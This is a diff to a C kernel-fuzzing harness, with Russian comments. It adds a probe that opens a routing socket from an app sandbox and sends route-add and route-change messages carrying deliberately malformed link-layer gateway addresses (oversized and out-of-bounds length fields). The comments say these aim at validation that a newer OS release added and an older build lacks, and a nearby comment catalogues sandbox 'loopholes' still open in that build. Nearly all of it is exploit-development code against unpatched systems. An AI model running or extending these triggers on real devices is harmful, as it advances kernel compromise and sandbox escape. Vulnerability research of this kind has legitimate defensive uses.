@@ -45410,6 +45410,157 @@ static void p_bq96(void) {
     fsync(fileno(stderr));
 }
 
+// p_bq97 — v258: AF_LINK gateway — ДОСТИЖИМОСТЬ routing socket из песочницы.
+// Контекст: 27.2 (B115) добавил os_log-валидацию sockaddr_dl gateway на
+// route-add («rejecting AF_LINK gateway ... (nlen %u, alen %u, sdl_len %u)» →
+// EINVAL) + bounds-copy check («link address does not fit (sdl_alen %u)»);
+// в b4/435 этих проверок НЕТ. Вопрос-фокус (§236-задание): доходит ли
+// управляемый sockaddr_dl из app-sandbox до изменённого участка вообще —
+// priv-gate стоит ДО или ПОСЛЕ парсинга rtm_addrs?
+// Контроль §144: G0 RTM_GET (формат жив, reply-эхо) — без него ADD-ошибки
+// неотличимы от битого формата.
+#define BQ97_RTM_VER 5
+#define BQ97_RTM_HDRSZ 92
+static int bq97_snd(int s, int type, int flags, int addrs,
+                    const uint8_t *dst, size_t dstsz,
+                    const uint8_t *mask, size_t masksz,
+                    const uint8_t *gw, size_t gwsz,
+                    const uint8_t *ifp, size_t ifpsz,
+                    int seq, uint8_t *reply, size_t replysz) {
+    uint8_t buf[512];
+    memset(buf, 0, sizeof(buf));
+    size_t off = BQ97_RTM_HDRSZ;
+    *(uint16_t *)(buf + 0) = 0;            // rtm_msglen — ниже
+    buf[2] = BQ97_RTM_VER;
+    buf[3] = (uint8_t)type;
+    *(int32_t *)(buf + 8) = flags;
+    *(int32_t *)(buf + 12) = addrs;
+    *(int32_t *)(buf + 16) = getpid();
+    *(int32_t *)(buf + 20) = seq;
+    if (dst) { memcpy(buf + off, dst, dstsz); off += (dstsz + 7) & ~7; }
+    if (mask) { memcpy(buf + off, mask, masksz); off += (masksz + 7) & ~7; }
+    if (gw) { memcpy(buf + off, gw, gwsz); off += (gwsz + 7) & ~7; }
+    if (ifp) { memcpy(buf + off, ifp, ifpsz); off += (ifpsz + 7) & ~7; }
+    *(uint16_t *)(buf + 0) = (uint16_t)off;
+    ssize_t n = write(s, buf, off);
+    int werr = (n < 0) ? errno : 0;
+    memset(reply, 0, replysz);
+    ssize_t r = -1; int rerr = 0;
+    if (n >= 0) {
+        r = read(s, reply, replysz);
+        rerr = (r < 0) ? errno : 0;
+    }
+    int rt_errno = (r >= 24) ? *(int32_t *)(reply + 24) : 0;
+    int rt_type = (r >= 4) ? reply[3] : 0;
+    LOG("[bq97]   type=%#x addrs=%#x: write=%zd (errno %d) read=%zd (errno %d) | reply type=%#x rtm_errno=%d (%s)",
+        type, addrs, n, werr, r, rerr, rt_type, rt_errno,
+        rt_errno ? strerror(rt_errno) : "ok");
+    return rt_errno ? -rt_errno : (int)r;
+}
+
+static void p_bq97(void) {
+    LOG("[bq97] v258: AF_LINK gw — достижимость routing socket из песочницы (§236)");
+    fsync(fileno(stderr));
+    int s = socket(AF_ROUTE, SOCK_RAW, 0);
+    if (s < 0) {
+        LOG("[bq97] socket(AF_ROUTE) FAILED errno=%d (%s) — ВЕКТОР ЗАКРЫТ НА ВХОДЕ",
+            errno, strerror(errno));
+        fsync(fileno(stderr));
+        return;
+    }
+    LOG("[bq97] socket(AF_ROUTE, SOCK_RAW, 0) = %d — ОТКРЫТ", s);
+    struct timeval tv = { 2, 0 };
+    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+    int seq = 100;
+    uint8_t reply[512];
+
+    // sockaddr_in хелпер: {len, family, port=0, addr, zeros}
+    uint8_t sa_in[16];
+    memset(sa_in, 0, 16);
+    sa_in[0] = 16; sa_in[1] = 2; // AF_INET
+
+    // sockaddr_dl хелпер
+    #define BQ97_SDL(gwbuf, len, family, index, type_, nlen, alen, slen, data, dlen) do { \
+        memset(gwbuf, 0, sizeof(gwbuf)); \
+        (gwbuf)[0] = (uint8_t)(len); (gwbuf)[1] = (uint8_t)(family); \
+        *(uint16_t *)((gwbuf) + 2) = (uint16_t)(index); \
+        (gwbuf)[4] = (uint8_t)(type_); (gwbuf)[5] = (uint8_t)(nlen); \
+        (gwbuf)[6] = (uint8_t)(alen); (gwbuf)[7] = (uint8_t)(slen); \
+        if (dlen) memcpy((gwbuf) + 8, (data), (dlen)); \
+    } while (0)
+
+    // === G0 КОНТРОЛЬ: RTM_GET 1.1.1.1 — формат и reply живы? ===
+    uint8_t dst_get[16];
+    memcpy(dst_get, sa_in, 16);
+    *(uint32_t *)(dst_get + 4) = htonl(0x01010101);
+    LOG("[bq97] G0 RTM_GET 1.1.1.1 (контроль формата):");
+    int g0 = bq97_snd(s, 0x4 /*RTM_GET*/, 0, 0x1 /*RTA_DST*/, dst_get, 16,
+                      NULL, 0, NULL, 0, NULL, 0, ++seq, reply, sizeof(reply));
+    uint16_t if_index = (g0 >= 4) ? *(uint16_t *)(reply + 4) : 0;
+    LOG("[bq97]   G0 → %d; reply rtm_index=%u %s", g0, if_index,
+        g0 > 0 ? "*** КОНТРОЛЬ ПРОЙДЕН: socket жив, формат верен ***" : "*** CONTROL FAILED ***");
+    fsync(fileno(stderr));
+    if (g0 <= 0) return;
+
+    // dst 10.201.201.201/32
+    uint8_t dst_add[16], mask_add[16];
+    memcpy(dst_add, sa_in, 16);
+    *(uint32_t *)(dst_add + 4) = htonl(0x0AC9C9C9);   // 10.201.201.201
+    memcpy(mask_add, sa_in, 16);
+    *(uint32_t *)(mask_add + 4) = htonl(0xFFFFFFFF);
+
+    // === G1 RTM_ADD с обычным INET-gateway ===
+    uint8_t gw_in[16];
+    memcpy(gw_in, sa_in, 16);
+    *(uint32_t *)(gw_in + 4) = htonl(0x0A000001);      // 10.0.0.1
+    LOG("[bq97] G1 RTM_ADD 10.201.201.201/32 via INET 10.0.0.1:");
+    bq97_snd(s, 0x1, 0x1 | 0x2 | 0x4 | 0x800 /*UP|GATEWAY|HOST|STATIC*/,
+             0x1 | 0x2 | 0x4, dst_add, 16, mask_add, 16, gw_in, 16,
+             NULL, 0, ++seq, reply, sizeof(reply));
+    fsync(fileno(stderr));
+
+    // === G2..G6 RTM_ADD с sockaddr_dl gateway ===
+    struct { const char *n; uint8_t len, nlen, alen, slen, dlen; uint8_t data[8]; } sdlv[] = {
+        { "G2 SDL легит len=20 alen=6",       20, 0,  6,     0, 6, {0xAA,0xBB,0xCC,0xDD,0xEE,0xFF} },
+        { "G3 SDL len=8 alen=6 (OOB-клейм)",   8, 0,  6,     0, 6, {0xAA,0xBB,0xCC,0xDD,0xEE,0xFF} },
+        { "G4 SDL len=20 alen=0xFF (oversize)",20, 0,  0xFF,  0, 0, {0} },
+        { "G5 SDL len=20 nlen=0xFF",           20, 0xFF, 0,  0, 0, {0} },
+        { "G6 SDL len=255 alen=247",           255, 0, 247,   0, 0, {0} },
+    };
+    uint8_t ifp_dl[24];
+    BQ97_SDL(ifp_dl, 20, 18, if_index, 6 /*IFT_ETHER*/, 3, 0, 0, "en0", 3);
+    for (unsigned v = 0; v < sizeof(sdlv) / sizeof(sdlv[0]); v++) {
+        uint8_t gw[264];
+        BQ97_SDL(gw, sdlv[v].len, 18, if_index, 6, sdlv[v].nlen,
+                 sdlv[v].alen, sdlv[v].slen, sdlv[v].data,
+                 sdlv[v].dlen ? sdlv[v].dlen : (sdlv[v].len > 8 ? sdlv[v].len - 8 : 0));
+        LOG("[bq97] %s (rtm_addrs=DST|GW|IFP):", sdlv[v].n);
+        bq97_snd(s, 0x1, 0x1 | 0x2 | 0x4 | 0x800,
+                 0x1 | 0x2 | 0x10, dst_add, 16, NULL, 0, gw, sdlv[v].len,
+                 ifp_dl, 20, ++seq, reply, sizeof(reply));
+        fsync(fileno(stderr));
+        usleep(100000);
+    }
+
+    // === G7 RTM_CHANGE c мутированным SDL gw на G1-маршрут ===
+    uint8_t gw_bad[24];
+    BQ97_SDL(gw_bad, 20, 18, if_index, 6, 0, 0xFF, 0, NULL, 0);
+    LOG("[bq97] G7 RTM_CHANGE 10.201.201.201/32 c SDL alen=0xFF gw:");
+    bq97_snd(s, 0x3 /*RTM_CHANGE*/, 0x1 | 0x2 | 0x4,
+             0x1 | 0x2 | 0x4, dst_add, 16, mask_add, 16, gw_bad, 20,
+             NULL, 0, ++seq, reply, sizeof(reply));
+    fsync(fileno(stderr));
+
+    // === cleanup: RTM_DELETE ===
+    LOG("[bq97] cleanup RTM_DELETE 10.201.201.201/32:");
+    bq97_snd(s, 0x2, 0x1 | 0x4, 0x1 | 0x4, dst_add, 16, mask_add, 16,
+             NULL, 0, NULL, 0, ++seq, reply, sizeof(reply));
+    fsync(fileno(stderr));
+    close(s);
+    LOG("[bq97] ИТОГ: матрица завершена (живо? = нет паники)");
+    fsync(fileno(stderr));
+}
+
 // p_bq87 — v246: SANDBOX-ЛАЗЕЙКИ — что 27.2 ЗАКРЫЛ, а b4 ещё открыт?
 // security_sandbox кекст: +133 правил в 27.2. Каждое новое правило =
 // что-то было РАЗРЕШЕНО в 27.0 (наш b4) и ЗАПРЕЩЕНО в 27.2.
@@ -54020,6 +54171,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_BQ94")) { p_bq94(); LOG("[probe13] bq94-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ95")) { p_bq95(); LOG("[probe13] bq95-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ96")) { p_bq96(); LOG("[probe13] bq96-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ97")) { p_bq97(); LOG("[probe13] bq97-only mode, stop"); return NULL; }
         if (getenv("FUZZ_XPCENUM")) { p_xpcenum(); LOG("[xpcen] xpcenum-only mode, stop"); return NULL; }
         if (getenv("FUZZ_ASTRIS")) { p_astris(); LOG("[probe13] astris-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
